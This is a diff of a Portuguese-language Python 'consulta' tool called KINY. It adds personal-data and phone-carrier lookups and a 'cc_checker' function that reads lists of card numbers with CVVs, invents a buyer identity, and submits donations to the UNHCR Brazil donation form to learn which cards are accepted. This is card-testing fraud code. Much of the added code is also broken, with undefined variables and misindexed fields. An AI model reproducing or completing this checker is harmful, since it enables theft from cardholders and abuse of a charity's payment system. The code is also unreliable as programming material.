@@ -130,29 +130,28 @@ def bin():
         req = requests.get('https://lookup.binlist.net/'+bin_input,headers = headers)
         req_data = req.json()
     except:
-        print(f'{C}[{R}i{C}] Ocorreu um erro,tente novamente.')
-        clear()
-        os.system('figlet KINY')
-        print('Bandeira: {}'.format(req_data['scheme']))
-        print('Marca: {}'.format(req_data['brand']))
-        print('Tipo: {}'.format(req_data['type']))
-        print('Pais: {}'.format(req_data['country']['name']))
-        print('Latitude: {}'.format(req_data['country']['latitude']))
-        print('Longitude: {}'.format(req_data['country']['longitude']))
-        print('Moeda: {}'.format(req_data['country']['currency']))
-        print('Emoji: {}'.format(req_data['country']['emoji']))
-        print(f'{C}[{Y}i{C}] Deseja realizar uma nova consulta?')
-        print('1.Sim')
-        print('2.Não')
-        choice = input("===>")
-        if choice == '1' or choice == '01':
-            consultabin()
-        if choice == '2' or choice == '02':
-            pass
-        else:
-            print(f'{C}[{R}i{C}] Opção inválida')
-            time.sleep(3)
-            pass
+        print(f'{C}[{R}ERROR{C}] Ocorreu um erro,tente novamente.')
+    clear()
+    os.system('figlet KINY')
+    print('Bandeira: {}'.format(req_data['scheme']))
+    print('Marca: {}'.format(req_data['brand']))
+    print('Tipo: {}'.format(req_data['type']))
+    print('Pais: {}'.format(req_data['country']['name']))
+    print('Latitude: {}'.format(req_data['country']['latitude']))
+    print('Longitude: {}'.format(req_data['country']['longitude']))
+    print('Moeda: {}'.format(req_data['country']['currency']))
+    print('Emoji: {}'.format(req_data['country']['emoji']))
+    print(f'{C}[{Y}i{C}] Deseja realizar uma nova consulta?')
+    print('1.Sim')
+    print('2.Não')
+    choice = input("===>")
+    if choice == '1' or choice == '01':
+        bin()
+    elif choice == '2' or choice == '02':
+        pass
+    else:
+        print(f'{C}[{R}ERROR{C}] Opção inválida')
+        time.sleep(3)
 
 def crm():
     os.system("figlet KINY")
@@ -178,6 +177,16 @@ def crm():
             consultacrm()
     else:
         print(f'{C}[{R}i{C}] CRM invalido')
+    print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
+    print('1.Sim')
+    print('2.Não')
+    choice = input("===>")
+    if choice == "1" or choice == "01":
+        crm()
+    if choice == "2" or choice == "02":
+        pass
+    else:
+        print("Opcao invalida.")
 
 def gerar_pessoa(): #####REWORK
     print("refazer")
@@ -451,7 +460,7 @@ def consultacpf():
         print(f'{C}[{R}ERROR{C}] Opção inválida.')
         time.sleep(3)
     if cpf != '0':
-        try:
+        try:### Agradecemos ao p0is0n por essa parte :)
             h={
         'Content-Type': "text/xml, application/x-www-form-urlencoded;charset=ISO-8859-1, text/xml; charset=ISO-8859-1",
         'Cookie': "ASPSESSIONIDSCCRRTSA=NGOIJMMDEIMAPDACNIEDFBID;                       FGTServer=2A56DE837DA99704910F47A454B42D1A8CCF150E0874FDE491A399A5EF5657BC0CF03A1EEB1C685B4C118A83F971F6198A78",
@@ -484,3 +493,152 @@ def consultacpf():
             print(f'{R}CPF não existe{C}')
             print(f'{R}Tente novamente e pressione enter para retornar{C}')
             lo = input("===>")
+
+def consultaoperadora():
+    os.system("figlet KINY")
+    print(f'{C}[{G}i{C}] Exemplo: 48952021826')
+    print(f'{C}[{Y}i{C}] Limite de consultas: 6 consultas por hora.')
+    print(f'{C}[{Y}i{C}] Digite o numero com DDD.')
+    op_input = input("===>")
+    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
+    try:
+        request = requests.get('http://free.telein.com.br/sistema/consulta_json.php?chave=senhasite&numero='+op_input, headers=headers)
+        op_data = request.json()
+    except:
+        print(f'{C}[{R}i{C}] Limite de consultas atingido')
+        print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
+        print('1.Sim')
+        print('2.Não')
+        cho = input("===>")
+        if cho == '1' or cho == '01':
+            consultaoperadora()
+        if cho == '2' or cho == '02':
+            pass
+        else:
+            print(f'{C}[{R}i{C}] Opção inválida')
+    op_final = 'null'
+    if (op_data['operadora']) == '553016':
+        op_final = 'CLARO'
+    if (op_data['operadora']) == '553070':
+        op_final = 'OI'
+    if (op_data['operadora']) == '553066':
+        op_final = 'NEXTEL'
+    if (op_data['operadora']) == '553102':
+        op_final = 'TIM'
+    if (op_data['operadora']) == '553097':
+        op_final = 'VIVO'
+    elif (op_data['operadora']) == '99':
+        print(f'{C}[{R}*{C}] Não foi possível consultar a operadora')
+    if op_final == 'null':
+        print(f'{C}[{R}*{C}] Operadora invalida.')
+    else:
+        print(f'{C}[{G}*{C}] Operadora:'+op_final)
+    #print(op_data['operadora'])
+    print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
+    print('1.Sim')
+    print('2.Não')
+    cho = input("===>")
+    if cho == '1' or cho == '01':
+        consultaoperadora()
+    if cho == '2' or cho == '02':
+        pass
+    else:
+        print(f'{C}[{R}i{C}] Opção inválida')
+        time.sleep(3)
+
+def cc_checker():
+    try:
+        lista=open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
+    except:
+        print(f'{C}[{R}i{C}] Erro,verifique se é um arquivo.')
+        time.sleep(3)
+        pass
+    for gg in lista:
+        cc=gg.split('|')[0]
+        mes=gg.split('|')[1]
+        ano=gg.split('|')[2]
+        cvv=gg.split('|')[3]
+
+    data = requests.get('https://lookup.binlist.net/{}'.format(cc[0:6])).json()
+    pessoa = requests.get('https://randomuser.me/api/?nat={}'.format(data['country']['alpha2'])).json()
+    cpf = requests.get('http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
+
+    email_provider = ["@gmail.com","@outlook.com","@yahoo.com","@terra.com"]
+
+    email = (pessoa['results'][0]['first']) + "." + (pessoa['results'][0]['last']) + random.choice(email_provide)
+
+    print()
+    print(f'{C}[{G}i{C}] Consultando cartão')
+    print('Cartao: {}'.format(gg))
+    print('Bandeira: {}'.format(data['scheme']))
+    print('Tipo: {}'.format(data['type']))
+    print('Pais: {}'.format(data['country']))
+    print('Banco: {}'.format(data['bank']))
+    print('Nivel: {}'.format(data['brand']))
+    print()
+    print(f'{C}[{G}i{C}] Gerando pessoa aleatoria')
+    print('Nome: {} {}'.format(pessoa['results'][0]['first'],pessoa['results'][0]['last']))
+    print('Genero: {}'.format(pessoa['results'][0]['gender']))
+    print('Nascimento: {}'.format(pessoa['results'][0]['dob']['date'][0:10]))
+    print('CPF: {}'.format(cpf['number_formatted']))
+    print('CPF sem formatação: {}'.format(cpf['number']))
+    print('E-mail: {}'.format(email))
+    print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'],'-000'))
+    print('Endereço: {}'.format(pessoa['results'][0]['location']['street']['name']))
+    print('Cidade: {}'.format(pessoa['results'][0]['location']['city']))
+    print('Estado: {}'.format(pessoa['results'][0]['location']['state']))
+    print()
+
+    header = {
+        'Host': 'doar.acnur.org',
+        'Connection': 'keep-alive',
+        'Content-Length': '1036',
+        'Cache-Control': 'max-age\u003d0',
+        'Origin': 'https://doar.acnur.org',
+        'Upgrade-Insecure-Requests': '1',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3',
+        'Sec-Fetch-Site': 'same-origin',
+        'Referer': 'https://doar.acnur.org/acnur/donate.html',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
+        'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
+        }
+
+    if pessoa['results'][0]['gender'] == 'female':
+        gender = 'F'
+    if pessoa['results'][0]['gender'] == 'male':
+        gender = 'M'
+    if data['type'] == 'credit':
+        tipo = 'C'
+    if data['type'] == 'debit':
+        tipo = 'D'
+    nome = pessoa['results'][0]['first'] + pessoa['results'][0]['last']
+
+    donate='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf['number']+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pessoa['results'][0]['name']['first']+'&LASTNAME='+pessoa['results'][0]['name']['last']+'&EMAIL='+email.replace('@','%40')+'&GENDER='+gender+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+pessoa['results'][0]['location']['street']['name'].replace(' ','+')+'&STREET2='+Centro+'&CITY='+pessoa['results'][0]['location']['city'].replace(' ','+')+'&STATE='+pessoa(['results'][0]['location']['state'])+'&ZIP='+str(pessoa['results'][0]['location']['postcode'])+'-000'+'&COUNTRY='+data['country']+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo+'%2F'+data['scheme']+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv
+    RS=requests.request('POST',donate,headers=h,data=data).url
+    if RS=='https://doar.acnur.org/acnur/agradecimento.html':
+        print(f'{C}[{G}i{C}] Pagamento autorizado!')
+    else:
+        RS=RS.split('=')[3]
+        if RS=='REFUSED_PAYMENT':
+            print(f'{C}[{R}ERROR{C}] Transação recusada.')
+        elif RS=='DATA_INVALID':
+            print(f'{C}[{R}ERROR{C}] Cartão invalido.')
+        elif RS=='FAIL_UNKNOWN':
+            print(f'{C}[{R}ERROR{C}] Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
+        elif RS=='ERROR_NETWORK':
+            print(f'{C}[{R}ERROR{C}] Erro de rede.')
+        elif RS=='DATA_CARD_NOT_ALLOWED':
+            print(f'{C}[{R}ERROR{C}] Pagamento nao autorizado.')
+        elif RS=='REFUSED_PROVIDER':
+            print(f'{C}[{R}ERROR{C}] Pagamento recusado pela {Y}{band}{C}.')
+        elif RS=='REFUSED_BANK':
+            print('[{}ERROR{}] Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
+        elif RS=='DATA_MISSING':
+            print(f'{C}[{R}ERROR{C}] Algum dado faltando.')
+        else:
+            print(f'{C}[{R}ERROR{C}] Erro não listado.')
